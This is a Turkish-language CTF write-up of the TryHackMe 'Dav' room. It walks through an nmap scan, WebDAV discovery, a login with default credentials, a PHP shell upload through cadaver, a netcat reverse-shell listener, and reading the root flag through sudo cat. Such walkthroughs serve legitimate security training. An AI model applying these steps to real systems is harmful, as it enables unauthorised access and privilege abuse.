---
title: 'TryHackMe | Dav WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [webdav, sudo]
render_with_liquid: false
---

Bu yazımda TryHackMe platformunda yer alan “Dav” isimli meydan okumanın çözümünü göstereceğim. Öncelikle hedef’in üzerinde çalışan servisleri ve versiyonlarını öğrenmek adına bir nmap taraması gerçekleştireceğim.

```console
$ nmap -sV -sC -T4 10.10.112.72
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Tarama sonucunda sadece 80 numaralı portun açık olduğunu ve üzerinde Apache’nin 2.4.18 sürümünün çalıştığını öğrendim. Bu sürümde herhangi bir zafiyet bulunmuyor. Web uygulamasında ise Apache'nin varsayılan sayfası bulunuyor. Web uygulaması hakkında daha fazla bilgi toplamak için dirsearch aracını kullanacağım.

```console
$ dirsearch -u 10.10.112.72
[09:27:54] 401 -  459B  - /webdav/
[09:27:54] 401 -  459B  - /webdav/index.html
[09:27:54] 401 -  459B  - /webdav/servlet/webdav/
```

Tarama sonucunda 401 numaralı durum kodu ile webdav dizininin bulunduğunu öğrendik. Varsayılan kullanıcı adı ve parola ile giriş yapabiliyoruz.

```console
$curl -u "wampp:xampp" http://10.10.112.72/webdav/
...
<td><a href="passwd.dav">passwd.dav</a></td><td align="right">2019-08-25 20:43  </td><td align="right"> 44 </td><td>&nbsp;</td></tr>
...
```

Dizindeki passwd.dav dosyası içerisinde giriş yaptığımız kullanıcı bilgileri barınıyor. Cadaver aracını kullanarak içerisine php shell yükleyeceğim.

```console
$ cadaver http://10.10.112.72/webdav/
Username: wampp
Password: 
dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 5493 bytes succeeded.
```

Yüklediğim php dosyasını çalıştırdıktan ve dinlemeye aldıktan sonra 1234 numaralı port üzerinden bir bağlantı elde ettim.

```console
$nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.21.66.61] from (UNKNOWN) [10.10.26.33] 48276
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 06:48:36 up 5 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

/home/merlin dizininde bulunan user.txt dosyasındaki bayrağı aldıktan sonra “sudo -l” komutunu kullandım ve cat komutunu kullanarak root haklarında işlemler yapabileceğimi öğrendim

```console
www-data@ubuntu:/home/merlin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

Tabi /etc/shadow dosyasında root kullanıcısının hash’i bulunmuyor. Diğer kullanıcıların hashlerini kırmakla uğraşmak istemediğimden doğrudan /root/root.txt dosyasından son bayrağı alıyorum.

```console
www-data@ubuntu:/home/merlin$ sudo cat /root/root.txt
1011***7af7afa5
www-data@ubuntu:/home/merlin$
```
